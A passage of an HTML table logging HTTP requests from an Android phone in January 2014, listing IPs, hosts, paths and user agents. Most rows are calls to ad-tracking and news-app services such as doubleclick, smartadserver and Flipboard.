      <td>                        Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100, de</td>
    </tr>
    <tr>
      <th>59 </th>
      <td>  12765</td>
      <td>   193.46.63.233</td>
      <td>                         faz.ivwbox.de</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         /cgi-bin/ivw/CP/szmmobil_222F000006E7;faz.net/aktuell/mobil/ressorts/wirtschaft?n=&amp;d=1390051122</td>
      <td>                            Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100</td>
    </tr>
    <tr>
      <th>60 </th>
      <td>  34317</td>
      <td>   107.20.177.34</td>
      <td>                  fbprod.flipboard.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  /init3.php?callback=callbackTable.jsonpCallback1146518</td>
      <td> Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100/4.3.1(18)/samsung/GT-N7000</td>
    </tr>
    <tr>
      <th>61 </th>
      <td>  35821</td>
      <td>   107.20.177.34</td>
      <td>                  fbprod.flipboard.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   /load?app=aml&amp;action=load&amp;page=1&amp;sess=3352901904944345600.1390058020.s&amp;id=3743464895410673152.1390039154.u&amp;ts=1390058021.101&amp;tz=-60&amp;url=http%253A%252F%252Fwww.stern.de%252Fpolitik%252Fdeutschland%252Fwahlen-zum-ministerpraesidenten-in-hessen-volker-bouffier-setzt-sich-gegen-max-mustermann-durch-2083964.html%2523utm_source%253Dstandard%252526utm_medium%253Drss-feed%252526utm_campaign%253Dalle&amp;fr=fl&amp;articleType=article&amp;totalPages=1&amp;section=flipboard%2Fmix%252F30924883&amp;pr=rss-stern&amp;dv=aphone&amp;amv=2.4</td>
      <td> Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100/4.3.1(18)/samsung/GT-N7000</td>
    </tr>
    <tr>
      <th>62 </th>
      <td>  98600</td>
      <td>  173.194.70.121</td>
      <td>                     feeds.reuters.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      /Reuters/worldNews</td>
      <td>                                                                                                                                                                                                              Ultimate DayDream</td>
    </tr>
    <tr>
      <th>63 </th>
      <td>  73977</td>
      <td>     2.16.216.19</td>
      <td>                      gllto.glpals.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          /rtistatus.dat</td>
      <td>                                                                                                                                                                                                                           None</td>
    </tr>
    <tr>
      <th>64 </th>
      <td>  43894</td>
      <td> 173.194.116.185</td>
      <td>           googleads.g.doubleclick.net</td>
      <td> GET</td>
      <td>                                                                                                                /mads/gma?preqs=0&amp;session_id=17592708045346502934&amp;u_sd=1.6750001&amp;seq_num=1&amp;u_w=477&amp;msid=com.iudesk.android.photo.editor&amp;js=afma-sdk-a-v6.4.1&amp;ms=nb-L0MAMQe8GvfY_GF6rij7OVhr7yp8iklRfdZEsobLfPN2V1HAwhr3fZaYYsV8OvnBAI7zvDSK59SGWlN8KYfs6k4fUhLp8gwe1zJEHx3aqI1SDtGvoMoDutEe208dqebTP_5d2Ydk4yTNoeVXbACMjJRSOmtoMcMr-P84vo-d1J-36mfPUt4gIueReT9-a1nSfXwrGJ2asIUygSe5Z6OG2q805BRqRtNkbyhnefM7MheC_wWGiqgvdJHjrKa5AZu78GZhAyaseI89idFJ7Qm8Tp4ngsn93gewdu0PP_xJnsQp1DTgrzZMJINW9n2AiZO0CZz5d7vxXMqtPlnNReA&amp;mv=80240021.com.android.vending&amp;bas_off=0&amp;format=320x50_mb&amp;oar=0&amp;net=ed&amp;app_name=2014010100.android.com.iudesk.android.photo.editor&amp;hl=de&amp;gnt=8&amp;u_h=764&amp;carrier=26207&amp;bas_on=0&amp;ptime=0&amp;u_audio=3&amp;imbf=8009&amp;u_so=p&amp;output=html&amp;region=mobile_app&amp;u_tz=60&amp;client_sdk=1&amp;ex=1&amp;slotname=a14ecccef2eb8b3&amp;gsb=4g&amp;caps=inlineVideo_interactiveVideo_mraid1_th_mediation_sdkAdmobApiForAds_di&amp;eid=46621027&amp;jsv=66&amp;urll=935</td>
      <td>                                                        Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 (Mobile; afma-sdk-a-v6.4.1)</td>
    </tr>
    <tr>
      <th>65 </th>
      <td>  44015</td>
      <td> 173.194.116.185</td>
      <td>           googleads.g.doubleclick.net</td>
      <td> GET</td>
      <td>                                                                                             /mads/gma?preqs=1&amp;session_id=17592708045346502934&amp;seq_num=2&amp;u_w=477&amp;msid=com.iudesk.android.photo.editor&amp;js=afma-sdk-a-v6.4.1&amp;prnl=9113&amp;bas_off=0&amp;imbf=8009&amp;net=ed&amp;app_name=2014010100.android.com.iudesk.android.photo.editor&amp;hl=de&amp;gnt=8&amp;carrier=26207&amp;u_audio=3&amp;u_sd=1.6750001&amp;ms=9yd99ZXvdmEJUHLeuHhY3u41mO_tOfndaTotwt2F-DVGft5m9EnXHzmLRD4RgOdlrS79cEhF2TGnDLGU0yj7ZzSMp8TS0MCClasMlEOLyViG8uYbFKmnHxqgdV3_FLSnwqHN7_us4Zr2azrucwql5_9qW_5so47ZR9XHBJYGiVcJy0B6aYPDbvad-njT6YVf0U5IqZIAjoZ20jX1ojaFE-pu0rpUdANjwxYgkh0UEJXhZHgF5lo_Msi3AW3UMa6K_Xk5HqVR3TeRMwwOr9qfkNTiUDyUEwqGqnCkWUzWkmdfanS64UprjTGxmQ675siWdWmE-AeqzfaRVcseiw74mw&amp;mv=80240021.com.android.vending&amp;format=320x50_mb&amp;oar=0&amp;u_h=764&amp;bas_on=0&amp;ptime=69277&amp;prl=11406&amp;u_so=p&amp;output=html&amp;region=mobile_app&amp;u_tz=60&amp;client_sdk=1&amp;ex=1&amp;slotname=a14ecccef2eb8b3&amp;askip=1&amp;gsb=4g&amp;caps=inlineVideo_interactiveVideo_mraid1_th_mediation_sdkAdmobApiForAds_di&amp;jsv=66&amp;urll=935</td>
      <td>                                                        Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 (Mobile; afma-sdk-a-v6.4.1)</td>
    </tr>
    <tr>
      <th>66 </th>
      <td>  44250</td>
      <td> 173.194.116.185</td>
      <td>           googleads.g.doubleclick.net</td>
      <td> GET</td>
      <td>                                                                                                                /mads/gma?preqs=2&amp;session_id=17592708045346502934&amp;seq_num=3&amp;u_w=477&amp;msid=com.iudesk.android.photo.editor&amp;js=afma-sdk-a-v6.4.1&amp;bas_off=0&amp;imbf=8009&amp;net=ed&amp;app_name=2014010100.android.com.iudesk.android.photo.editor&amp;hl=de&amp;gnt=8&amp;carrier=26207&amp;u_audio=3&amp;u_sd=1.6750001&amp;ms=XkHxq-pxBucbuAFEkgVz2ud3dAVCQKuG51SBPj7bZfgF7bIgIAKWjPjzuzEbPRCoG9YdIIdfS0XIF080Ae7KZffsMMq3RNME_iiMIZ8MTwRDB-YeW4zvjEsnKvpBx8I2fWNbmGW0_Kp2QCrSz09jfVNkogEkRcEKO-cGqLraPZRP6abz1c17ArgCPJbF8m591KXGAud04Sgts4WNz0_xe85Jg-yh1z3bsQIE_l1mFOfYp9O2Acb2MOUlY8Op0xl4oAhyVjHcwXEOSvcgAngio5TzMdlLwvRYDbJw3Az9gc4Q6qb8ivHK0hqLibrlhhWYIDCjFFvi9WchF64W0hvVxg&amp;mv=80240021.com.android.vending&amp;format=320x50_mb&amp;oar=0&amp;u_h=764&amp;bas_on=0&amp;ptime=182048&amp;u_so=p&amp;output=html&amp;region=mobile_app&amp;u_tz=60&amp;client_sdk=1&amp;ex=1&amp;slotname=a14ecccef2eb8b3&amp;askip=2&amp;gsb=4g&amp;caps=inlineVideo_interactiveVideo_mraid1_th_mediation_sdkAdmobApiForAds_di&amp;jsv=66&amp;urll=916</td>
      <td>                                                        Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 (Mobile; afma-sdk-a-v6.4.1)</td>
    </tr>
    <tr>
      <th>67 </th>
      <td>  44262</td>
      <td> 173.194.116.185</td>
      <td>           googleads.g.doubleclick.net</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              /pagead/adview?ai=C4oveubvaUq_KM4Sl-walkoHgDrvKzaYEi4T6sk7AjbcBEAEgAFCAx-HEBGCVAoIBHmNhLW1iLWFwcC1wdWItMzY5ODg4OTAwNjYzNzE0NcgBCagDAaoE4QFP0NsZQDgdR6m6-UsNs3NVOfzWrEARwv7eNFrr-tHmgBdGDZ6KgYOfKLRHPVClkG1Tb2rikEmy2-99FD1WSc63202JSQF0wr8_ulyVw6VMd8qYGzYkpXEDPBS6WpcCLNBw2LI9YtZme6wOTtdjRKLRKzi1NTv0wPeC-RBzCUgbEGhY9n4jMkE-LSry1ijzbh_bmzt9omLv-rRcJKmN3lxR4HsdoEGLDkydEv4KkDlBE0o1q9Qr4ANgAyIVUBeIebKS492NihSJaqggq5ty4cs_w-FEotQjnDtOm0nKiESJJr-ABsy73YTZq8KRHKAGIQ&amp;sigh=ktzmIelvDAY</td>
      <td>                                                        Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 (Mobile; afma-sdk-a-v6.4.1)</td>
    </tr>
    <tr>
      <th>68 </th>
      <td>  43921</td>
      <td> 173.194.116.185</td>
      <td>           googleads.g.doubleclick.net</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              /pagead/adview?ai=CFehGBrvaUq3DGceO-waprICADrvKzaYEi4T6sk7AjbcBEAEgAFCAx-HEBGCVAoIBHmNhLW1iLWFwcC1wdWItMzY5ODg4OTAwNjYzNzE0NcgBCagDAaoE4QFP0B_pKoVqRzGQjrH8fOm0S6WhhXyS0bjy79z88fOE1v8xwyfxVHI748bWF7lKJl8WaoC5QvD5uU2-W4C4s0mB0-GY6tgV4Qk_yBBU86_CNmH4QSD1GKrp9qKCoxDptbkCfRtWlzlk4GhFFBQUYpE3hemX5nduj1f-5hkaXYuSPoDF4QqPTXL8zACO6EUIHSY2_I1QeeVj1iqrEHmOqQbgU24nHiNCvMVee1A5tJOYlqPc4Plh0th8mdcLuvBYAn6Q-UJTVexCneBJLjL6XhlFduPecycLn-ITziOuF4ip9oOABsy73YTZq8KRHKAGIQ&amp;sigh=DWUbGB2Sr7A</td>
      <td>                                                        Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 (Mobile; afma-sdk-a-v6.4.1)</td>
    </tr>
    <tr>
      <th>69 </th>
      <td>  39775</td>
      <td> 173.194.116.185</td>
      <td>           googleads.g.doubleclick.net</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       /pixel?google_nid=a9&amp;google_cm&amp;ex=doubleclick.net</td>
      <td>                            Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100</td>
    </tr>
    <tr>
      <th>70 </th>
      <td>   9698</td>
      <td>  91.215.101.109</td>
      <td>                        gsea.ivwbox.de</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        /cgi-bin/ivw/CP/0114_05?r=http%3A//flipboard.com/redirect%3Furl%3Dhttp%253A%252F%252Fwww.tagesschau.de%252Fschlusslicht%252Finternet242.html&amp;d=36300.35824608058</td>
      <td>                            Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100</td>
    </tr>
    <tr>
      <th>71 </th>
      <td> 132318</td>
      <td>    80.82.201.85</td>
      <td>                        gwp.nuggad.net</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  /rc?nuggn=480104072&amp;nuggsid=1248589405</td>
      <td>                        Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100, de</td>
    </tr>
    <tr>
      <th>72 </th>
      <td> 136834</td>
      <td>    80.82.201.85</td>
      <td>                        gwp.nuggad.net</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  /rc?nuggn=480104072&amp;nuggsid=1364201110</td>
      <td>                        Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100, de</td>
    </tr>
    <tr>
      <th>73 </th>
      <td>  20857</td>
      <td>  37.252.162.217</td>
      <td>                          ib.adnxs.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   /bounce?%2Fgetuid%3Fhttp%253A%252F%252Fib.adnxs.com%252Fgetuid%253Fhttp%25253A%25252F%25252Fd.shareaholic.com%25252Fdough%25252F1.0%25252Fmixer.gif%25253Fp_name%25253DAN%252526p_id%25253D%252524UID</td>
      <td>                        Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100, de</td>
    </tr>
    <tr>
      <th>74 </th>
      <td>  20865</td>
      <td>  37.252.162.217</td>
      <td>                          ib.adnxs.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          /getuid?http%3A%2F%2Fd.shareaholic.com%2Fdough%2F1.0%2Fmixer.gif%3Fp_name%3DAN%26p_id%3D%24UID</td>
      <td>                        Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100, de</td>
    </tr>
    <tr>
      <th>75 </th>
      <td>  20841</td>
      <td>  37.252.162.217</td>
      <td>                          ib.adnxs.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               /getuid?http%3A%2F%2Fib.adnxs.com%2Fgetuid%3Fhttp%253A%252F%252Fd.shareaholic.com%252Fdough%252F1.0%252Fmixer.gif%253Fp_name%253DAN%2526p_id%253D%2524UID</td>
      <td>                        Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100, de</td>
    </tr>
    <tr>
      <th>76 </th>
      <td>  39779</td>
      <td>  37.252.162.214</td>
      <td>                          ib.adnxs.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       /getuid?http://s.amazon-adsystem.com/ecm3?id=$UID&amp;ex=appnexus.com</td>
      <td>                            Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100</td>
    </tr>
    <tr>
      <th>77 </th>
      <td>  39788</td>
      <td>     2.16.216.40</td>
      <td>                   image5.pubmatic.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               /AdServer/usersync/usersync.html?predirect=http%3A%2F%2Fs.amazon-adsystem.com%2Fecm3%3Fid%3DPM_UID%26ex%3Dpubmatic.com&amp;userIdMacro=PM_UID</td>
      <td>                            Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100</td>
    </tr>
    <tr>
      <th>78 </th>
      <td>  42816</td>
      <td>    178.236.4.60</td>
      <td>                 images.waskochich.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 /rezept_des_tages/v1/18.01.2014/recipe.json?vcode=14&amp;sdk=18&amp;lang=de-DE&amp;platform=android</td>
      <td>                                                                                                                                                                 android-async-http/1.4.3 (http://loopj.com/android-async-http)</td>
    </tr>
    <tr>
      <th>79 </th>
      <td> 103828</td>
      <td>  194.232.190.70</td>
      <td>                images03.futurezone.at</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     /entordnungsmaschine.jpg/46.491.152</td>
      <td>                                                                                                                                                                  null (FlipboardProxy/1.1; +http://flipboard.com/browserproxy)</td>
    </tr>
    <tr>
      <th>80 </th>
      <td>  19517</td>
      <td>   88.198.24.175</td>
      <td>                      intelcrawler.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          /about/press07</td>
      <td>                        Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100, de</td>
    </tr>
    <tr>
      <th>81 </th>
      <td>   4808</td>
      <td>  91.103.142.129</td>
      <td>              mobile.smartadserver.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         /call2/pubmj/31924/220174/13500/S/689547290/unfall%3Bundefined?</td>
      <td>                            Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100</td>
    </tr>
    <tr>
      <th>82 </th>
      <td>   5118</td>
      <td>  91.103.142.129</td>
      <td>              mobile.smartadserver.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         /call2/pubmj/31924/220174/13501/S/689547290/unfall%3Bundefined?</td>
      <td>                            Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100</td>
    </tr>
    <tr>
      <th>83 </th>
      <td>   4810</td>
      <td>  91.103.142.129</td>
      <td>              mobile.smartadserver.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         /call2/pubmj/31924/220174/13531/M/689547290/unfall%3Bundefined?</td>
      <td>                            Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100</td>
    </tr>
    <tr>
      <th>84 </th>
      <td>  16308</td>
      <td>  91.103.142.194</td>
      <td>              mobile.smartadserver.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         /call2/pubmj/31924/220217/13500/S/9074574292/streaming%3Bngx%3D1%3Bnd_agr%3D6%3Bnd_gnd%3D1%3Bnd_hsh%3D1%3Bnd_dcb%3D1%3Bnd_dcd%3D1%3Bnd_dcp%3D1%3Bnd_dcs%3D6%3B?</td>
      <td>                            Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100</td>
    </tr>
    <tr>
      <th>85 </th>
      <td>  16306</td>
      <td>  91.103.142.194</td>
      <td>              mobile.smartadserver.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         /call2/pubmj/31924/220217/13501/S/9074574292/streaming%3Bngx%3D1%3Bnd_agr%3D6%3Bnd_gnd%3D1%3Bnd_hsh%3D1%3Bnd_dcb%3D1%3Bnd_dcd%3D1%3Bnd_dcp%3D1%3Bnd_dcs%3D6%3B?</td>
      <td>                            Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100</td>
    </tr>
    <tr>
      <th>86 </th>
      <td>  16304</td>
      <td>  91.103.142.194</td>
      <td>              mobile.smartadserver.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         /call2/pubmj/31924/220217/13531/M/9074574292/streaming%3Bngx%3D1%3Bnd_agr%3D6%3Bnd_gnd%3D1%3Bnd_hsh%3D1%3Bnd_dcb%3D1%3Bnd_dcd%3D1%3Bnd_dcp%3D1%3Bnd_dcs%3D6%3B?</td>
      <td>                            Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100</td>
    </tr>
    <tr>
      <th>87 </th>
      <td> 132498</td>
      <td>  91.103.142.194</td>
      <td>              mobile.smartadserver.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       /call2/pubmj/31924/220236/13500/S/4907709071/hochschulen%3Bngx%3D1%3Bnd_agr%3D6%3Bnd_gnd%3D1%3Bnd_hsh%3D1%3Bnd_dcb%3D1%3Bnd_dcd%3D1%3Bnd_dcp%3D1%3Bnd_dcs%3D6%3B?</td>
      <td>                        Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100, de</td>
    </tr>
    <tr>
      <th>88 </th>
      <td> 132509</td>
      <td>  91.103.142.194</td>
      <td>              mobile.smartadserver.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       /call2/pubmj/31924/220236/13501/S/4907709071/hochschulen%3Bngx%3D1%3Bnd_agr%3D6%3Bnd_gnd%3D1%3Bnd_hsh%3D1%3Bnd_dcb%3D1%3Bnd_dcd%3D1%3Bnd_dcp%3D1%3Bnd_dcs%3D6%3B?</td>
      <td>                        Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100, de</td>
    </tr>
    <tr>
      <th>89 </th>
      <td> 132496</td>
      <td>  91.103.142.194</td>
      <td>              mobile.smartadserver.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       /call2/pubmj/31924/220236/13531/M/4907709071/hochschulen%3Bngx%3D1%3Bnd_agr%3D6%3Bnd_gnd%3D1%3Bnd_hsh%3D1%3Bnd_dcb%3D1%3Bnd_dcd%3D1%3Bnd_dcp%3D1%3Bnd_dcs%3D6%3B?</td>
      <td>                        Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100, de</td>
    </tr>
    <tr>
      <th>90 </th>
      <td>  12696</td>
      <td>  91.103.140.193</td>
      <td>              mobile.smartadserver.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     /call2/pubmj/42361/286422/13500/S/3367962420/ngx%3D1%3Bnd_agr%3D6%3Bnd_gnd%3D1%3Bnd_hsh%3D1%3Bnd_dcb%3D1%3Bnd_dcd%3D1%3Bnd_dcp%3D1%3Bnd_dcs%3D1%3B?</td>
      <td>                            Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100</td>
    </tr>
    <tr>
      <th>91 </th>
      <td>  12698</td>
      <td>  91.103.140.193</td>
      <td>              mobile.smartadserver.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     /call2/pubmj/42361/286422/13501/S/3367962420/ngx%3D1%3Bnd_agr%3D6%3Bnd_gnd%3D1%3Bnd_hsh%3D1%3Bnd_dcb%3D1%3Bnd_dcd%3D1%3Bnd_dcp%3D1%3Bnd_dcs%3D1%3B?</td>
      <td>                            Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100</td>
    </tr>
    <tr>
      <th>92 </th>
      <td>  12694</td>
      <td>  91.103.140.193</td>
      <td>              mobile.smartadserver.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     /call2/pubmj/42361/286422/13531/M/3367962420/ngx%3D1%3Bnd_agr%3D6%3Bnd_gnd%3D1%3Bnd_hsh%3D1%3Bnd_dcb%3D1%3Bnd_dcd%3D1%3Bnd_dcp%3D1%3Bnd_dcs%3D1%3B?</td>
      <td>                            Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100</td>
    </tr>
    <tr>
      <th>93 </th>
      <td> 136889</td>
      <td>  91.103.142.194</td>
      <td>              mobile.smartadserver.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     /call2/pubmj/42361/286438/13500/S/5189938149/ngx%3D1%3Bnd_agr%3D6%3Bnd_gnd%3D1%3Bnd_hsh%3D1%3Bnd_dcb%3D1%3Bnd_dcd%3D1%3Bnd_dcp%3D1%3Bnd_dcs%3D6%3B?</td>
